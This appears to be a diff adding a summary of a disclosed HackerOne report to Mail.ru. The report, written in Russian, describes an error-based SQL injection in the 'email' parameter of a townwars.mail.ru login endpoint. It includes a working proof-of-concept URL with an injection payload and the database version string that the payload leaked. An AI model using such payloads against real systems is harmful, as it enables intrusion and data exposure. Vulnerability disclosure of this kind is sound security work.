@@ -1,0 +1,20 @@
+ReportLink:https://hackerone.com/reports/137956
+WeaknessName:SQL Injection
+Reporter:https://hackerone.com/konqi
+ReportedTo:Mail.ru(mailru)
+BountyAmount:150.0
+Severity:
+State:Closed
+DateOfDisclosure:26.05.2016 11:32:52
+
+Summary:
+
+Добрый день. Из за недостаточной фильтрации GET параметра "email" можно провести атаку типа SQL Injection. Вектор атаки - Error based.
+
+PoC (вывод версии СУБД)
+
+https://townwars.mail.ru/?c=Login2&m=Auth&email=1'+and+1=(select+version()::bigint)--&pass=test&save_me=0&origin=0&target=WwwForum
+
+вывод данных в ошибке 
+
+"PostgreSQL 9.0.1 on amd64-portbld-freebsd8.1, compiled by GCC cc (GCC) 4.2.1 20070719 [FreeBSD], 64-bit"
